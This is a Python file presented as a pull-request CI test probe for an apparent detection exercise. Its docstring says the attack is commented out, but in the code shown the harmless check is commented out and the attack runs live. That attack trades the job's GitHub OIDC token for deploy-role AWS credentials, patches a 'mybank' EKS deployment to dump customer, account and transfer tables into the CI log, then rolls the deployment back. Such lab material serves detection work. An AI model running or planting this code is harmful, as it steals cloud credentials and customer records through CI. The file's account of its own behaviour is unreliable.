"""PR-run test probe for the detection exercise.

A pull request runs this file in CI before anyone reviews it. By default it is harmless: it
prints a status line and exits. The real attack is pre-written but shipped **entirely commented
out** below — a stand-in for code an attacker authored. A legitimate change just edits
CHECK_NOTE; the attack is to comment out the smoke_check() call and uncomment the block.

Everything uses synthetic data in the owned lab. The attack copies pod output into
the owned GitHub Actions log; no real records or separate webhook receiver are used.
"""

# CHECK_NOTE = "ok"


# def smoke_check() -> None:
#     """Harmless default behavior: print a status line. This is all a legitimate PR runs."""
#     import json
#     from datetime import UTC, datetime

#     print(json.dumps({"check_note": CHECK_NOTE, "status": "ok",
#                       "checked_utc": datetime.now(UTC).isoformat()}), flush=True)


# if __name__ == "__main__":
#     smoke_check()


# === ATTACK PAYLOAD (shipped commented out) — uncomment to run; see detection README ==========
def run_attack() -> None:
    import json
    import os
    import subprocess
    import time
    import urllib.parse
    import urllib.request

    import boto3
    from botocore import UNSIGNED
    from botocore.config import Config

    region = os.environ.get("AWS_REGION", "us-east-1")

    # 1) Exchange the job's GitHub OIDC token for the deploy role's temporary credentials.
    parsed = urllib.parse.urlparse(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    query = urllib.parse.parse_qsl(parsed.query) + [("audience", "sts.amazonaws.com")]
    url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
    req = urllib.request.Request(
        url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    with urllib.request.urlopen(req, timeout=20) as resp:
        token = json.load(resp)["value"]
    sts = boto3.client("sts", region_name=region, config=Config(signature_version=UNSIGNED))
    creds = sts.assume_role_with_web_identity(
        RoleArn=os.environ["DETECTION_DEMO_ROLE_ARN"],
        RoleSessionName=os.environ.get("DETECTION_SESSION_NAME", "release-looking-demo"),
        WebIdentityToken=token, DurationSeconds=900)["Credentials"]
    who = boto3.client(
        "sts", region_name=region, aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]).get_caller_identity()
    print(json.dumps({"obtained_identity": who["Arn"]}), flush=True)
    if os.environ.get("GITHUB_EVENT_NAME") != "pull_request":
        return

    # 2) Use the stolen identity to replace the app with a container that dumps the tables,
    #    inheriting the app's data-reading identity — the pivot from deploy to data.
    env = {**os.environ, "AWS_ACCESS_KEY_ID": creds["AccessKeyId"],
           "AWS_SECRET_ACCESS_KEY": creds["SecretAccessKey"],
           "AWS_SESSION_TOKEN": creds["SessionToken"], "AWS_DEFAULT_REGION": region}
    cluster = os.environ["EKS_CLUSTER_NAME"]
    subprocess.run(["aws", "eks", "update-kubeconfig", "--name", cluster,
                    "--region", region], env=env, check=True)
    reader = (
        "import boto3,os,json;"
        'd=boto3.client("dynamodb",region_name=os.environ["AWS_REGION"]);'
        'print("STOLEN CUSTOMER RECORDS:");'
        '[print(json.dumps({"t":os.environ[e],"items":[i for pg in '
        'd.get_paginator("scan").paginate(TableName=os.environ[e]) for i in pg["Items"]]})) '
        'for e in ("CUSTOMERS_TABLE","ACCOUNTS_TABLE","TRANSFERS_TABLE") if os.environ.get(e)]'
    )
    patch = {"spec": {"template": {"spec": {"containers": [{
        "name": "api", "command": ["sh", "-c", f"python -c '{reader}'; sleep 3600"],
        "livenessProbe": None, "readinessProbe": None, "startupProbe": None}]}}}}
    subprocess.run(["kubectl", "-n", "mybank", "patch", "deployment", "mybank-api",
                    "--type", "strategic", "-p", json.dumps(patch)], env=env, check=True)
    records = ""
    for _ in range(18):
        time.sleep(10)
        out = subprocess.run(["kubectl", "-n", "mybank", "logs", "-l",
                              "app.kubernetes.io/name=mybank-api", "--tail=50"],
                             env=env, capture_output=True, text=True).stdout
        if "STOLEN CUSTOMER RECORDS" in out:
            records = out
            break
    print(records or "(no records captured yet)", flush=True)
    subprocess.run(["kubectl", "-n", "mybank", "rollout", "undo",
                    "deployment/mybank-api"], env=env, check=False)
    print("Restored the legitimate app.", flush=True)


if __name__ == "__main__":
    run_attack()
